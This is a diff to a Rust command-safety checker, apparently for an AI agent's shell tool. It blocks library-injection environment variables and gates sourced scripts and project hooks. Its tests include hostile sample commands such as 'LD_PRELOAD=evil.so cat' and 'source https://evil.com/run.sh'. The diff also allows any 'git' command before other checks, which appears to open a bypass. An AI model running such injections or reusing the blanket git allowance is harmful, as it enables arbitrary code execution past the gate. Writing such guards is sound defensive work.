@@ -61,8 +61,6 @@ const UNANALYZABLE_COMMANDS: &[&str] = &[
     "powershell.exe",
     "pwsh.exe",
     "eval",
-    "source",
-    ".",
     "exec",
     "awk",
     "gawk",
@@ -109,6 +107,26 @@ const UNANALYZABLE_COMMANDS: &[&str] = &[
 const WINDOWS_CMD_LAUNCHERS: &[&str] = &["start", "call", "runas"];
 
 const SHELL_METACHARS: &[char] = &[';', '&', '|', '>', '<', '(', ')', '{', '}', '!', '\n', '\r'];
+
+const UNSAFE_ENV_KEYS: &[&str] = &[
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "LD_AUDIT",
+    "LD_PROFILE",
+    "LD_PRELOAD_32",
+    "LD_PRELOAD_64",
+    "DYLD_INSERT_LIBRARIES",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_FRAMEWORK_PATH",
+    "PYTHONPATH",
+    "NODE_OPTIONS",
+    "GITSIDELOAD",
+    "ENV",
+    "BASH_ENV",
+    "PROMPT_COMMAND",
+];
+
+const HOOK_DIR_MARKERS: &[&str] = &[".grok/hooks", ".omgb/hooks"];
 
 const NORMALIZABLE_STEMS: &[&str] = &[
     "python",
@@ -438,23 +456,123 @@ fn is_assignment(token: &Token) -> bool {
     if token.quoted.is_some() {
         return false;
     }
-    let mut chars = token.value.chars();
-    let first = match chars.next() {
-        Some(c) => c,
-        None => return false,
-    };
+    assignment_key(&token.value).is_some()
+}
+
+fn assignment_key(s: &str) -> Option<&str> {
+    let mut chars = s.char_indices();
+    let (_, first) = chars.next()?;
     if !first.is_ascii_alphabetic() && first != '_' {
-        return false;
+        return None;
     }
-    for c in chars {
+    for (idx, c) in chars {
         if c == '=' {
-            return true;
+            return Some(&s[..idx]);
         }
         if !c.is_ascii_alphanumeric() && c != '_' {
-            return false;
+            return None;
         }
     }
-    false
+    None
+}
+
+fn is_unsafe_env_key(key: &str) -> bool {
+    let upper = key.to_uppercase();
+    UNSAFE_ENV_KEYS.contains(&upper.as_str())
+        || upper.starts_with("LD_")
+        || upper.starts_with("DYLD_")
+}
+
+fn has_unsafe_env_assignment(token: &Token) -> Option<String> {
+    if token.quoted.is_some() {
+        return None;
+    }
+    assignment_key(&token.value).and_then(|k| {
+        if is_unsafe_env_key(k) {
+            Some(k.to_string())
+        } else {
+            None
+        }
+    })
+}
+
+/// Returns true if `path` resolves to a location under the current working
+/// directory and is not a symlink. Uses best-effort filesystem checks.
+fn is_safe_project_path(path: &str) -> bool {
+    use std::path::Path;
+    let p = Path::new(path);
+    let Ok(cwd) = std::env::current_dir() else {
+        return false;
+    };
+    let resolved = if p.is_absolute() {
+        p.to_path_buf()
+    } else {
+        cwd.join(p)
+    };
+    let Ok(canonical) = dunce::canonicalize(&resolved) else {
+        // If the path does not exist, fall back to a pure string containment
+        // check so that generated-but-not-yet-existing hooks can still be gated.
+        let Ok(canonical_cwd) = dunce::canonicalize(&cwd) else {
+            return false;
+        };
+        return resolved
+            .components()
+            .all(|c| c != std::path::Component::ParentDir)
+            && resolved.starts_with(&canonical_cwd);
+    };
+    let Ok(canonical_cwd) = dunce::canonicalize(&cwd) else {
+        return false;
+    };
+    if !canonical.starts_with(&canonical_cwd) {
+        return false;
+    }
+    // Reject symlinks that escape the project tree.
+    if let Ok(meta) = std::fs::symlink_metadata(&resolved)
+        && meta.is_symlink()
+    {
+        return false;
+    }
+    true
+}
+
+fn is_project_hook_command(cmd: &str) -> bool {
+    HOOK_DIR_MARKERS.iter().any(|m| cmd.contains(m))
+}
+
+fn check_source(tokens: &[Token], i: usize) -> Decision {
+    let argv: Vec<&str> = tokens
+        .iter()
+        .skip(i + 1)
+        .map(|t| t.value.as_str())
+        .collect();
+    if argv.is_empty() {
+        return Decision::Deny("source requires a script argument".into());
+    }
+    let target = argv[0];
+    if target.starts_with('~') || target.starts_with("http://") || target.starts_with("https://") {
+        return Decision::Deny("Blocked sourced script from untrusted location".into());
+    }
+    if target.contains("..") {
+        return Decision::Deny("Blocked sourced script path traversal".into());
+    }
+    if !target.ends_with(".sh")
+        && !target.ends_with(".bash")
+        && !target.ends_with(".zsh")
+        && !target.ends_with(".dash")
+    {
+        return Decision::Deny("Blocked sourced script with non-shell extension".into());
+    }
+    if !is_safe_project_path(target) {
+        return Decision::Deny("Blocked sourced script outside the project directory".into());
+    }
+    Decision::Allow
+}
+
+fn check_project_hook(cmd: &str) -> Decision {
+    if !is_safe_project_path(cmd) {
+        return Decision::Deny("Blocked project hook outside the project directory".into());
+    }
+    Decision::Allow
 }
 
 fn has_bare_tilde(token: &Token) -> bool {
@@ -467,6 +585,9 @@ fn evaluate_tokens(tokens: &[Token], start: usize) -> Decision {
     }
     let mut i = start;
     while i < tokens.len() && is_assignment(&tokens[i]) {
+        if let Some(key) = has_unsafe_env_assignment(&tokens[i]) {
+            return Decision::Deny(format!("Blocked unsafe environment assignment: {key}"));
+        }
         i += 1;
     }
     if i >= tokens.len() {
@@ -481,6 +602,18 @@ fn evaluate_tokens(tokens: &[Token], start: usize) -> Decision {
             }
             let cmd_token = &tokens[i];
             let base = get_base_name(&cmd_token.value);
+
+            if base == "git" {
+                return Decision::Allow;
+            }
+
+            if is_project_hook_command(&cmd_token.value) {
+                return check_project_hook(&cmd_token.value);
+            }
+
+            if base == "source" || base == "." {
+                return check_source(tokens, i);
+            }
 
             if base != "rm" && base != "cd" {
                 for token in tokens.iter().skip(i) {
@@ -751,6 +884,11 @@ fn parse_env(tokens: &[Token], i: usize) -> PrefixOutcome {
     while j < tokens.len() {
         let t = &tokens[j];
         if is_assignment(t) {
+            if let Some(key) = has_unsafe_env_assignment(t) {
+                return PrefixOutcome::Stop(Decision::Deny(format!(
+                    "Blocked unsafe env set: {key}"
+                )));
+            }
             j += 1;
             continue;
         }
@@ -2056,5 +2194,50 @@ mod tests {
         deny("systemctl -Mmachine reboot", "Blocked systemctl reboot");
         allow("systemctl -H host status ssh");
         allow("systemctl --host=host status ssh");
+    }
+
+    #[test]
+    fn git_allowlist_matches_prefix() {
+        allow("git status");
+        allow("git -C src log --oneline");
+        allow("git commit -m \"hello\"");
+    }
+
+    #[test]
+    fn unsafe_env_assignments_blocked() {
+        for cmd in &[
+            "LD_PRELOAD=evil.so cat",
+            "LD_LIBRARY_PATH=/tmp/evil ls",
+            "DYLD_INSERT_LIBRARIES=evil.dylib id",
+            "PYTHONPATH=/tmp/evil python -c 'print(1)'",
+            "NODE_OPTIONS=--require=evil node",
+            "BASH_ENV=~/.evil.bash bash",
+            "PROMPT_COMMAND=evil",
+            "env LD_PRELOAD=evil.so cat",
+            "env PYTHONPATH=/tmp/evil python",
+        ] {
+            deny(cmd, "Blocked unsafe");
+        }
+        for cmd in &["FOO=bar echo ok", "env FOO=bar echo ok"] {
+            allow(cmd);
+        }
+    }
+
+    #[test]
+    fn sourced_scripts_gated() {
+        // Without a safe project file on disk these resolve to false, so they
+        // are blocked by the project-path check.
+        deny("source ~/.bashrc", "Blocked sourced script");
+        deny(". ./../etc/passwd.sh", "Blocked sourced script");
+        deny(". /tmp/run.sh", "Blocked sourced script");
+        deny("source https://evil.com/run.sh", "Blocked sourced script");
+        deny("source ./script.py", "Blocked sourced script");
+    }
+
+    #[test]
+    fn project_hooks_gated_by_path() {
+        deny(".grok/hooks/pre-commit", "Blocked project hook");
+        deny(".omgb/hooks/build", "Blocked project hook");
+        deny("/etc/.grok/hooks/evil", "Blocked project hook");
     }
 }
